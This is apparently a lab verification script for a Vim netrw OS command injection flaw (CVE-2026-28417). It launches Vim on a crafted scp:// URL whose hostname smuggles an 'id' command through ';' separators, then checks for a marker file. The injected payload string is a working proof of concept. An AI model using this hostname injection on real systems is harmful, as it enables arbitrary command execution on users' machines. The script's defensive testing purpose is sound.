#!/bin/bash
# CVE-2026-28417 - Vim netrw OS Command Injection - Verification Script
# This script verifies the vulnerability is triggerable in the lab container.
#
# Usage: docker exec cve-2026-28417-vulnerable /workspace/test_vuln.sh
set -e

# IMPORTANT: The marker filename must NOT contain '/' because netrw's URL
# parsing regex [^/#:] uses '/' as hostname terminator. The injected command
# runs in Vim's CWD, so we use a plain filename.
MARKER="CVE-2026-28417-PROOF"

echo "=== CVE-2026-28417: Vim netrw OS Command Injection ==="
echo ""

# Show Vim version
echo "[*] Vim version:"
vim --version | head -2
echo ""

# Show vulnerable code
echo "[*] Vulnerable hostname validation:"
sed -n '/^function s:NetrwValidateHostname/,/^endfunction/p' \
    /usr/local/share/vim/vim92/pack/dist/opt/netrw/autoload/netrw.vim
echo ""

# Clean up any previous marker
cd /workspace
rm -f "$MARKER"

# Trigger the vulnerability:
# Payload: scp://a;id>CVE-2026-28417-PROOF;b/dir/
# - netrw parses hostname as "a;id>CVE-2026-28417-PROOF;b" (weak '^[a-z0-9]' passes)
# - MakeSshCmd constructs: "ssh  a;id>CVE-2026-28417-PROOF;b ls -FLa"
# - Shell interprets ; as command separator:
#   1) "ssh a"                         -> fails (expected)
#   2) "id>CVE-2026-28417-PROOF"       -> RCE! writes id output to file
#   3) "b ls -FLa"                     -> fails (expected)
echo "[*] Triggering command injection..."
echo "    Payload: scp://a;id>${MARKER};b/dir/"
echo "    Expected: netrw passes hostname validation, constructs shell command"
echo "    with unescaped metacharacters, shell executes 'id' command"
echo ""

timeout 15 vim --clean \
    -c "packadd netrw" \
    -c "e scp://a;id>${MARKER};b/dir/" \
    -c "qa!" \
    </dev/null >/dev/null 2>&1 || true

# Verify
echo "[*] Checking for command injection evidence..."
if [ -f "/workspace/$MARKER" ]; then
    echo ""
    echo "[+] ========================================"
    echo "[+] VULNERABLE - Command injection confirmed"
    echo "[+] ========================================"
    echo "[+] Marker file: /workspace/$MARKER"
    echo "[+] Contents (output of injected 'id' command):"
    echo "    $(cat /workspace/$MARKER)"
    echo ""
    exit 0
else
    echo ""
    echo "[-] Marker file not created. Vulnerability may not have triggered."
    echo "[-] This could indicate the fix has been applied."
    exit 1
fi
